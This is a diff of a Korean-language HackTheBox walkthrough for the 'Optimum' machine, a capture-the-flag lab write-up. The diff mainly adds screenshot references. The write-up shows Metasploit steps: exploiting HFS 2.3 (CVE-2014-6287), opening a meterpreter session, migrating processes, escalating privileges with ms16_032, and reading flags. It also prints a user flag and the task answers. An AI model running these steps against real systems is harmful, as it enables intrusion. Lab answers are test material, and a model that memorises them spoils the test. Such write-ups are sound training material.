@@ -1,3 +1,4 @@
+
 # HackTheBox Walkthrough - Machine: Optimum
 
 **Target IP**: 10.129.19.252  
@@ -8,10 +9,10 @@
 
 ## 🧭 Task 1: Which version of HttpFileServer is running on TCP port 80?
 
-### 🔍 진행 과정
 ```bash
 nmap -sV -sC -oA nmap/Optimum 10.129.19.252
 ```
+![nmap](img/nmap.png)
 
 결과:
 ```
@@ -26,9 +27,9 @@ PORT   STATE SERVICE VERSION
 
 ## 🐞 Task 2: What is the 2014 CVE ID for a remote code execution vulnerability in the findMacroMarker function in HttpFileServer 2.3 version?
 
-### 🔍 진행 과정
 - Google 검색: `hfs 2.3 findMacroMarker vulnerability site:cve.mitre.org`
-- CVE 페이지: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287
+- CVE 페이지: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287  
+![cve](img/cve.png)
 
 ### ✅ Answer: `CVE-2014-6287`
 
@@ -36,7 +37,8 @@ PORT   STATE SERVICE VERSION
 
 ## 👤 Task 3: What user is the webserver running as?
 
-### 🔍 진행 과정
+![search](img/search.png)
+
 ```bash
 msfconsole
 search HFS 2.3
@@ -48,6 +50,8 @@ run
 ```
 
 Exploit 성공 후:
+![meterpreter](img/meterpreter.png)
+
 ```bash
 meterpreter > getuid
 ```
@@ -63,11 +67,11 @@ Server username: kostas
 
 ## 📄 Task 4: Submit the user flag
 
-### 🔍 진행 과정
 ```bash
 meterpreter > cd Desktop
 meterpreter > cat user.txt
 ```
+![userflag](img/userflag.png)
 
 결과:
 ```
@@ -80,10 +84,11 @@ a8c34f2075cb73ab5b880a41f791d2ca
 
 ## 🔑 Task 5 (Optional): What is the password for the kostas user?
 
-### 🔍 진행 과정
 ```bash
 meterpreter > sysinfo
 ```
+![sysinfo](img/sysinfo.png)
+
 - OS: Windows Server 2012 R2 x64
 - meterpreter는 x86이므로 `migrate` 수행 필요
 
@@ -98,16 +103,31 @@ meterpreter > migrate <explorer.exe PID>
 
 ## 📈 Task 6: Which metasploit reconnaissance module can be used to list possible privilege escalation paths?
 
-### 🔍 진행 과정
-- Exploit Suggestion
 ```bash
-use post/multi/recon/local_exploit_suggester
+meterpreter > sysinfo
 ```
 
-또는 검색:
+- Computer        : OPTIMUM
+- OS              : Windows Server 2012 R2 (6.3 Build 9600)
+- Architecture    : x64
+- Meterpreter     : x86/windows
+
 ```bash
-search suggester
+ps
+migrate 1572
 ```
+
+```bash
+ctrl + z
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+```
+
+![postexlpoit](img/postexlpoit.png)
+
+```bash
+run
+```
+![root](img/root.png)
 
 ### ✅ Answer: `local_exploit_suggester`
 
@@ -115,12 +135,11 @@ search suggester
 
 ## 👑 Submit Root Flag
 
-### 🔍 진행 과정
-
 ```bash
 meterpreter > cd C:\Users\Administrator\Desktop
 meterpreter > cat root.txt
 ```
+![rootflag](img/rootflag.png)
 
 결과:
 ```
